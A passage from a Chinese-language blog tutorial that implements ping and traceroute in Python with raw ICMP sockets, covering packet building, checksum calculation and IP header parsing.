Mask)应答</td></tr><tr><td>11</td><td>数据报超时</td><td></td></tr></tbody></table></div><h2 id="使用的库的官方文档"><a href="#使用的库的官方文档" class="headerlink" title="使用的库的官方文档"></a>使用的库的官方文档</h2><p><a href="https://docs.python.org/zh-cn/3/library/struct.html">struct库</a>：将字节串解读为打包的二进制数据</p><p><a href="https://docs.python.org/zh-cn/3/library/socket.html">socket库</a>：底层网络接口</p><p><a href="https://docs.python.org/zh-cn/3/library/select.html">select</a>库：等待 I/O 完成</p><h2 id="代码部分"><a href="#代码部分" class="headerlink" title="代码部分"></a>代码部分</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># encoding:utf-8</span><span class="token comment"># author:YGL</span><span class="token keyword">import</span> time<span class="token keyword">import</span> struct<span class="token keyword">import</span> socket<span class="token keyword">import</span> select<span class="token keyword">import</span> sys<span class="token keyword">class</span> <span class="token class-name">PING</span><span class="token punctuation">:</span>    IP_HEADER_LENGTH <span class="token operator">=</span> <span class="token number">20</span>    <span class="token keyword">def</span> <span class="token function">chesksum</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>        n <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>        m <span class="token operator">=</span> n <span class="token operator">%</span> <span class="token number">2</span>        <span class="token builtin">sum</span> <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> n <span class="token operator">-</span> m<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token builtin">sum</span> <span class="token operator">+=</span> <span class="token punctuation">(</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>                <span class="token punctuation">(</span>data<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span>            <span class="token punctuation">)</span>  <span class="token comment">#传入data以每两个字节（十六进制）通过ord转十进制，第一字节在低位，第二个字节在高位</span>        <span class="token keyword">if</span> m<span class="token punctuation">:</span>            <span class="token builtin">sum</span> <span class="token operator">+=</span> <span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token comment">#将高于16位与低16位相加</span>        <span class="token builtin">sum</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">sum</span> <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token builtin">sum</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">)</span>        <span class="token builtin">sum</span> <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token builtin">sum</span> <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span>  <span class="token comment">#如果还有高于16位，将继续与低16位相加</span>        answer <span class="token operator">=</span> <span class="token operator">~</span><span class="token builtin">sum</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span>        <span class="token comment">#  主机字节序转网络字节序列（参考小端序转大端序）</span>        answer <span class="token operator">=</span> answer <span class="token operator">>></span> <span class="token number">8</span> <span class="token operator">|</span> <span class="token punctuation">(</span>answer <span class="token operator">&lt;&lt;</span> <span class="token number">8</span> <span class="token operator">&amp;</span> <span class="token number">0xff00</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> answer    <span class="token keyword">def</span> <span class="token function">request_ping</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> data_type<span class="token punctuation">,</span> data_code<span class="token punctuation">,</span> data_checksum<span class="token punctuation">,</span> data_ID<span class="token punctuation">,</span>                     data_Sequence<span class="token punctuation">,</span> payload_body<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment">#  把字节打包成二进制数据</span>        imcp_packet <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'>BBHHH32s'</span><span class="token punctuation">,</span> data_type<span class="token punctuation">,</span> data_code<span class="token punctuation">,</span>                                  data_checksum<span class="token punctuation">,</span> data_ID<span class="token punctuation">,</span> data_Sequence<span class="token punctuation">,</span>                                  payload_body<span class="token punctuation">)</span>        icmp_chesksum <span class="token operator">=</span> self<span class="token punctuation">.</span>chesksum<span class="token punctuation">(</span>imcp_packet<span class="token punctuation">)</span>  <span class="token comment">#获取校验和</span>        <span class="token comment">#  把校验和传入，再次打包</span>        imcp_packet <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'>BBHHH32s'</span><span class="token punctuation">,</span> data_type<span class="token punctuation">,</span> data_code<span class="token punctuation">,</span>                                  icmp_chesksum<span class="token punctuation">,</span> data_ID<span class="token punctuation">,</span> data_Sequence<span class="token punctuation">,</span>                                  payload_body<span class="token punctuation">)</span>        <span class="token keyword">return</span> imcp_packet    <span class="token keyword">def</span> <span class="token function">raw_socket</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> dst_addr<span class="token punctuation">,</span> imcp_packet<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">'''        连接套接字,并将数据发送到套接字        '''</span>        <span class="token comment">#实例化一个socket对象，ipv4，原套接字，分配协议端口</span>        rawsocket <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_RAW<span class="token punctuation">,</span>                                  socket<span class="token punctuation">.</span>getprotobyname<span class="token punctuation">(</span><span class="token string">"icmp"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment">#记录当前请求时间</span>        send_request_ping_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment">#发送数据到网络</span>        rawsocket<span class="token punctuation">.</span>sendto<span class="token punctuation">(</span>imcp_packet<span class="token punctuation">,</span> <span class="token punctuation">(</span>dst_addr<span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment">#返回数据</span>        <span class="token keyword">return</span> send_request_ping_time<span class="token punctuation">,</span> rawsocket<span class="token punctuation">,</span> dst_addr    <span class="token keyword">def</span> <span class="token function">reply_ping</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>                   send_request_ping_time<span class="token punctuation">,</span>                   rawsocket<span class="token punctuation">,</span>                   data_Sequence<span class="token punctuation">,</span>                   timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            <span class="token comment">#开始时间</span>            started_select <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token comment">#实例化select对象，可读rawsocket，可写为空，可执行为空，超时时间</span>            what_ready <span class="token operator">=</span> select<span class="token punctuation">.</span>select<span class="token punctuation">(</span><span class="token punctuation">[</span>rawsocket<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> timeout<span class="token punctuation">)</span>            <span class="token comment">#等待时间</span>            wait_for_time <span class="token operator">=</span> <span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> started_select<span class="token punctuation">)</span>            <span class="token comment">#没有返回可读的内容，判断超时</span>            <span class="token keyword">if</span> what_ready<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">:</span>  <span class="token comment"># Timeout</span>                <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span>            <span class="token comment">#记录接收时间</span>            time_received <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token comment">#设置接收的包的字节为1024</span>            received_packet<span class="token punctuation">,</span> addr <span class="token operator">=</span> rawsocket<span class="token punctuation">.</span>recvfrom<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>            <span class="token comment">#获取接收包的icmp头</span>            icmpHeader <span class="token operator">=</span> received_packet<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token number">28</span><span class="token punctuation">]</span>            <span class="token comment">#反转编码</span>            <span class="token builtin">type</span><span class="token punctuation">,</span> code<span class="token punctuation">,</span> checksum<span class="token punctuation">,</span> packet_id<span class="token punctuation">,</span> sequence <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span>                <span class="token string">">BBHHH"</span><span class="token punctuation">,</span> icmpHeader<span class="token punctuation">)</span>            ttl <span class="token operator">=</span> self<span class="token punctuation">.</span>parse_ip_header<span class="token punctuation">(</span>received_packet<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token builtin">type</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">and</span> sequence <span class="token operator">==</span> data_Sequence<span class="token punctuation">:</span>                <span class="token keyword">return</span> time_received <span class="token operator">-</span> send_request_ping_time<span class="token punctuation">,</span> ttl            <span class="token comment">#数据包的超时时间判断</span>            timeout <span class="token operator">=</span> timeout <span class="token operator">-</span> wait_for_time            <span class="token keyword">if</span> timeout <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> ttl    <span class="token keyword">def</span> <span class="token function">parse_ip_header</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> ip_header<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        IP报文格式        1. 4位IP-version 4位IP头长度 8位服务类型 16位报文总长度        2. 16位标识符 3位标记位 13位片偏移 暂时不关注此行        3. 8位TTL 8位协议 16位头部校验和        4. 32位源IP地址        5. 32位目的IP地址        :param ip_header:        :return:        """</span>        line1 <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">'>BBH'</span><span class="token punctuation">,</span> ip_header<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># 先按照8位、8位、16位解析</span>        ip_version <span class="token operator">=</span> line1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">4</span>  <span class="token comment"># 通过右移4位获取高四位</span>        <span class="token comment"># 报文头部长度的单位是32位 即四个字节</span>        iph_length <span class="token operator">=</span> <span class="token punctuation">(</span>line1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">4</span>  <span class="token comment"># 与1111与运算获取低四位</span>        packet_length <span class="token operator">=</span> line1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>        line3 <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">'>BBH'</span><span class="token punctuation">,</span> ip_header<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        TTL <span class="token operator">=</span> line3<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        protocol <span class="token operator">=</span> line3<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        iph_checksum <span class="token operator">=</span> line3<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>        line4 <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">'>4s'</span><span class="token punctuation">,</span> ip_header<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        src_ip <span class="token operator">=</span> socket<span class="token punctuation">.</span>inet_ntoa<span class="token punctuation">(</span>line4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        line5 <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">'>4s'</span><span class="token punctuation">,</span> ip_header<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        dst_ip <span class="token operator">=</span> socket<span class="token punctuation">.</span>inet_ntoa<span class="token punctuation">(</span>line5<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span>            <span class="token string">'ip_version'</span><span class="token punctuation">:</span> ip_version<span class="token punctuation">,</span>            <span class="token string">'iph_length'</span><span class="token punctuation">:</span> iph_length<span class="token punctuation">,</span>            <span class="token string">'packet_length'</span><span class="token punctuation">:</span> packet_length<span class="token punctuation">,</span>            <span class="token string">'TTL'</span><span class="token punctuation">:</span> TTL<span class="token punctuation">,</span>            <span class="token string">'protocol'</span><span class="token punctuation">:</span> protocol<span class="token punctuation">,</span>            <span class="token string">'iph_checksum'</span><span class="token punctuation">:</span> iph_checksum<span class="token punctuation">,</span>            <span class="token string">'src_ip'</span><span class="token punctuation">:</span> src_ip<span class="token punctuation">,</span>            <span class="token string">'dst_ip'</span><span class="token punctuation">:</span> dst_ip        <span class="token punctuation">&#125;</span>    <span class="token keyword">def</span> <span class="token function">ping</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> host<span class="token punctuation">)</span><span class="token punctuation">:</span>        send<span class="token punctuation">,</span> accept<span class="token punctuation">,</span> lost <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span>        sumtime<span class="token punctuation">,</span> shorttime<span class="token punctuation">,</span> longtime<span class="token punctuation">,</span> avgtime <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span>        <span class="token comment">#icmp数据包的构建</span>        data_type <span class="token operator">=</span> <span class="token number">8</span>  <span class="token comment"># ICMP Echo Request</span>        data_code <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># must be zero</span>        data_checksum <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># "...with value 0 substituted for this field..."</span>        data_ID <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment">#Identifier</span>        data_Sequence <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment">#Sequence number</span>        payload_body <span class="token operator">=</span> <span class="token string">b'abcdefghijklmnopqrstuvwabcdefghi'</span>  <span class="token comment">#data</span>        <span class="token comment"># 将主机名转ipv4地址格式，返回以ipv4地址格式的字符串，如果主机名称是ipv4地址，则它将保持不变</span>        dst_addr <span class="token operator">=</span> socket<span class="token punctuation">.</span>gethostbyname<span class="token punctuation">(</span>host<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n正在 Ping &#123;0&#125; [&#123;1&#125;] 具有 32 字节的数据:"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> dst_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            send <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>            <span class="token comment">#请求ping数据包的二进制转换</span>            icmp_packet <span class="token operator">=</span> self<span class="token punctuation">.</span>request_ping<span class="token punctuation">(</span>data_type<span class="token punctuation">,</span> data_code<span class="token punctuation">,</span>                                            data_checksum<span class="token punctuation">,</span> data_ID<span class="token punctuation">,</span>                                            data_Sequence <span class="token operator">+</span> i<span class="token punctuation">,</span> payload_body<span class="token punctuation">)</span>            <span class="token comment">#连接套接字,并将数据发送到套接字</span>            send_request_ping_time<span class="token punctuation">,</span> rawsocket<span class="token punctuation">,</span> addr <span class="token operator">=</span> self<span class="token punctuation">.</span>raw_socket<span class="token punctuation">(</span>                dst_addr<span class="token punctuation">,</span> icmp_packet<span class="token punctuation">)</span>            <span class="token comment">#数据包传输时间</span>            times<span class="token punctuation">,</span> ttl <span class="token operator">=</span> self<span class="token punctuation">.</span>reply_ping<span class="token punctuation">(</span>send_request_ping_time<span class="token punctuation">,</span> rawsocket<span class="token punctuation">,</span>                                         data_Sequence <span class="token operator">+</span> i<span class="token punctuation">)</span>            <span class="token keyword">if</span> times <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"来自 &#123;0&#125; 的回复: 字节 = 32 时间 = &#123;1&#125;ms TTL = &#123;2&#125; "</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>                    addr<span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>times <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ttl<span class="token punctuation">[</span><span class="token string">'TTL'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                accept <span class="token operator">+=</span> <span class="token number">1</span>                return_time <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>times <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">)</span>                sumtime <span class="token operator">+=</span> return_time                longtime <span class="token operator">=</span> <span class="token builtin">max</span><span class="token punctuation">(</span>longtime<span class="token punctuation">,</span> return_time<span class="token punctuation">)</span>                shorttime <span class="token operator">=</span> <span class="token builtin">min</span><span class="token punctuation">(</span>return_time<span class="token punctuation">,</span> shorttime<span class="token punctuation">)</span>                time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.7</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                lost <span class="token operator">+=</span> <span class="token number">1</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"请求超时。"</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> send <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n&#123;0&#125; 的 Ping 统计信息:"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>dst_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>                    <span class="token string">"\t数据包：已发送 = &#123;0&#125;,接收 = &#123;1&#125;，丢失 = &#123;2&#125;（&#123;3&#125;%丢失），\n往返行程的估计时间（以毫秒为单位）：\n\t最短 = &#123;4&#125;ms，最长 = &#123;5&#125;ms，平均 = &#123;6&#125;ms"</span>                    <span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> accept<span class="token punctuation">,</span> lost<span class="token punctuation">,</span> lost <span class="token operator">/</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">100</span><span class="token punctuation">,</span>                            shorttime<span class="token punctuation">,</span> longtime<span class="token punctuation">,</span> sumtime <span class="token operator">/</span> send<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h2 id="最终结果"><a href="#最终结果" class="headerlink" title="最终结果"></a>最终结果</h2><p><img src="PING.png" alt="PING"><em>代码效果</em></p><h1 id="TRACEROUTE"><a href="#TRACEROUTE" class="headerlink" title="TRACEROUTE"></a>TRACEROUTE</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>因为和 PING 命令差不多 ，只需要更改TTL值即可，所以可以直接移用代码。实验过程需要关闭防火墙。</p><h2 id="总代码"><a href="#总代码" class="headerlink" title="总代码"></a>总代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">encoding</span><span class="token expression"><span class="token operator">:</span>utf<span class="token operator">-</span><span class="token number">8</span></span></span><span class="token keyword">import</span> <span class="token module">time</span><span class="token keyword">import</span> <span class="token keyword">struct</span><span class="token keyword">import</span> <span class="token module">socket</span><span class="token keyword">import</span> <span class="token module">select</span><span class="token keyword">import</span> <span class="token module">sys</span>from typing <span class="token keyword">import</span> <span class="token module">DefaultDict</span><span class="token keyword">class</span> <span class="token class-name">TraceRoute</span><span class="token punctuation">(</span>PING<span class="token punctuation">)</span><span class="token operator">:</span>    <span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">ICMP报文类型 <span class="token operator">=</span><span class="token operator">></span> 回送请求报文</span></span>    TYPE_ECHO_REQUEST <span class="token operator">=</span> <span class="token number">8</span>    CODE_ECHO_REQUEST_DEFAULT <span class="token operator">=</span> <span class="token number">0</span>    <span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">ICMP报文类型 <span class="token operator">=</span><span class="token operator">></span> 回送应答报文</span></span>    TYPE_ECHO_REPLY <span class="token operator">=</span> <span class="token number">0</span>    CODE_ECHO_REPLY_DEFAULT <span class="token operator">=</span> <span class="token number">0</span>    <span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">ICMP报文类型 <span class="token operator">=</span><span class="token operator">></span> 数据报超时报文</span></span>    TYPE_ICMP_OVERTIME <span class="token operator">=</span> <span class="token number">11</span>    CODE_TTL_OVERTIME <span class="token operator">=</span> <span class="token number">0</span>    <span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">ICMP报文类型 <span class="token operator">=</span><span class="token operator">></span> 目的站不可达报文</span></span>    TYPE_ICMP_UNREACHED <span class="token operator">=</span> <span class="token number">3</span>    CODE_NET_UNREACHED <span class="token operator">=</span> <span class="token number">0</span>    CODE_HOST_UNREACHED <span class="token operator">=</span> <span class="token number">1</span>    CODE_PORT_UNREACHED <span class="token operator">=</span> <span class="token number">3</span>    MAX_HOPS <span class="token operator">=</span> <span class="token number">30</span>  # 设置路由转发最大跳数为<span class="token number">30</span>    TIMEOUT <span class="token operator">=</span> <span class="token number">1</span>  # 如果一个请求超过<span class="token number">1</span>s未得到响应，则被认定为超时    TRIES <span class="token operator">=</span> <span class="token number">3</span>  # 对于每个中间站点，探测的次数设置为<span class="token number">1</span>    def <span class="token function">traceroute_raw_socket</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> dst_addr<span class="token punctuation">,</span> imcp_packet<span class="token punctuation">,</span> ttl<span class="token punctuation">)</span><span class="token operator">:</span>        #实例化一个socket对象，ipv4，原套接字，分配协议端口        rawsocket <span class="token operator">=</span> socket<span class="token punctuation">.</span><span class="token function">socket</span><span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_RAW<span class="token punctuation">,</span>                                  socket<span class="token punctuation">.</span><span class="token function">getprotobyname</span><span class="token punctuation">(</span><span class="token string">"icmp"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        rawsocket<span class="token punctuation">.</span><span class="token function">setsockopt</span><span class="token punctuation">(</span>socket<span class="token punctuation">.</span>IPPROTO_IP<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>IP_TTL<span class="token punctuation">,</span> ttl<span class="token punctuation">)</span>        #记录当前请求时间        send_request_traceroute_time <span class="token operator">=</span> time<span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        #发送数据到网络        rawsocket<span class="token punctuation">.</span><span class="token function">sendto</span><span class="token punctuation">(</span>imcp_packet<span class="token punctuation">,</span> <span class="token punctuation">(</span>dst_addr<span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        #返回数据        <span class="token keyword">return</span> send_request_traceroute_time<span class="token punctuation">,</span> rawsocket<span class="token punctuation">,</span> dst_addr    def <span class="token function">build_imcp_packet</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> host<span class="token punctuation">)</span><span class="token operator">:</span>        <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">icmp</span><span class="token expression">数据包的构建</span></span>        data_checksum <span class="token operator">=</span> <span class="token number">0</span>  # <span class="token string">"...with value 0 substituted for this field..."</span>        data_ID <span class="token operator">=</span> <span class="token number">0</span>  #Identifier        data_Sequence <span class="token operator">=</span> <span class="token number">1</span>  #Sequence number        payload_body <span class="token operator">=</span> b<span class="token char">'abcdefghijklmnopqrstuvwabcdefghi'</span>  #data        #  把字节打包成二进制数据        imcp_packet <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">pack</span><span class="token punctuation">(</span><span class="token char">'>BBHHH32s'</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>TYPE_ECHO_REQUEST<span class="token punctuation">,</span>                                  self<span class="token punctuation">.</span>CODE_ECHO_REQUEST_DEFAULT<span class="token punctuation">,</span>                                  data_checksum<span class="token punctuation">,</span> data_ID<span class="token punctuation">,</span> data_Sequence<span class="token punctuation">,</span>                                  payload_body<span class="token punctuation">)</span>        icmp_chesksum <span class="token operator">=</span> self<span class="token punctuation">.</span><span class="token function">chesksum</span><span class="token punctuation">(</span>imcp_packet<span class="token punctuation">)</span>  #获取校验和        #  把校验和传入，再次打包        imcp_packet <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">pack</span><span class="token punctuation">(</span><span class="token char">'>BBHHH32s'</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>TYPE_ECHO_REQUEST<span class="token punctuation">,</span>                                  self<span class="token punctuation">.</span>CODE_ECHO_REQUEST_DEFAULT<span class="token punctuation">,</span>                                  icmp_chesksum<span class="token punctuation">,</span> data_ID<span class="token punctuation">,</span> data_Sequence<span class="token punctuation">,</span>                                  payload_body<span class="token punctuation">)</span>        <span class="token keyword">return</span> imcp_packet    def <span class="token function">traceroute</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> host<span class="token punctuation">)</span><span class="token operator">:</span>        # 将主机名转ipv4地址格式，返回以ipv4地址格式的字符串，如果主机名称是ipv4地址，则它将保持不变        dst_addr <span class="token operator">=</span> socket<span class="token punctuation">.</span><span class="token function">gethostbyname</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span>        <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"\nrouting &#123;0&#125;[&#123;1&#125;](max hops = 30, detect tries = 3)\n"</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>            host<span class="token punctuation">,</span> dst_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> ttl in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>MAX_HOPS<span class="token punctuation">)</span><span class="token operator">:</span>            <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125;"</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>ttl<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>            flag <span class="token operator">=</span> False            <span class="token keyword">for</span> tries in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>TRIES<span class="token punctuation">)</span><span class="token operator">:</span>                imcp_packet <span class="token operator">=</span> self<span class="token punctuation">.</span><span class="token function">build_imcp_packet</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span>                send_request_traceroute_time<span class="token punctuation">,</span> rawsocket<span class="token punctuation">,</span> dst_addr <span class="token operator">=</span> self<span class="token punctuation">.</span><span class="token function">traceroute_raw_socket</span><span class="token punctuation">(</span>                    dst_addr<span class="token punctuation">,</span> imcp_packet<span class="token punctuation">,</span> ttl<span class="token punctuation">)</span>                ready <span class="token operator">=</span> select<span class="token punctuation">.</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token punctuation">[</span>rawsocket<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>TIMEOUT<span class="token punctuation">)</span>                end_time <span class="token operator">=</span> time<span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                during_time <span class="token operator">=</span> end_time <span class="token operator">-</span> send_request_traceroute_time                global ip_head<span class="token punctuation">,</span> receive_packet<span class="token punctuation">,</span> addr                <span class="token keyword">if</span> during_time <span class="token operator">>=</span> self<span class="token punctuation">.</span>TIMEOUT<span class="token operator">:</span>                    <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"    *   "</span><span class="token punctuation">,</span> end<span class="token 